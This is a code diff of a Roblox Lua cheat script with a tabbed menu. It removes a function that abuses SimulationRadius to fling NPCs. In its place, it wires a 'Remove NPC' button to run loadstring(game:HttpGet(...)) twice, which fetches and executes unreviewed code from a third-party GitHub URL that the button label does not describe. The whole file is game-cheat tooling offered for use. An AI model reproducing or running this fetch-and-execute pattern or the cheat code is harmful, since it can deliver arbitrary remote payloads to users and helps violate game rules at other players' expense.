@@ -908,57 +908,13 @@ Tabs.Farm:AddToggle("AntiAFK", {
     end
 })
 
-local function DumbAllNpc()
-    local Players = game:GetService("Players")
-    local lp = Players.LocalPlayer
-
-    pcall(function()
-        if sethiddenproperty then
-            sethiddenproperty(lp, "SimulationRadius", math.huge)
-        else
-            lp.SimulationRadius = math.huge
-        end
-    end)
-
-    local function punishNPC(npc)
-        local hrp = npc:FindFirstChild("HumanoidRootPart")
-        local hum = npc:FindFirstChildOfClass("Humanoid")
-
-        if hrp and hum then
-            if not Players:GetPlayerFromCharacter(npc) then
-                if not string.find(string.lower(npc.Name), "lucky block") then
-                    
-                    hrp.Anchored = false
-
-                    npc:PivotTo(CFrame.new(
-                        math.random(-50,50),
-                        1000,
-                        math.random(-50,50)
-                    ))
-
-                    hrp.Velocity = Vector3.new(0,200,0)
-                    hrp.RotVelocity = Vector3.new(999,999,999)
-
-                    hum:ChangeState(Enum.HumanoidStateType.Physics)
-                end
-            end
-        end
-    end
-
-    for _, v in pairs(workspace:GetDescendants()) do
-        if v:IsA("Model") then
-            punishNPC(v)
-        end
-    end
-end
-
 Tabs.Main:AddButton({
     Title = "Remove NPC",
     Description = "Remove All Brainrot Boss",
     Callback = function()
-        DumbAllNpc()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeoneDoingSomething01/ThatsAGoodRepo/refs/heads/main/I_Miss_You"))()
         task.wait(2)
-        DumbAllNpc()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeoneDoingSomething01/ThatsAGoodRepo/refs/heads/main/I_Miss_You"))()
     end
 })
 
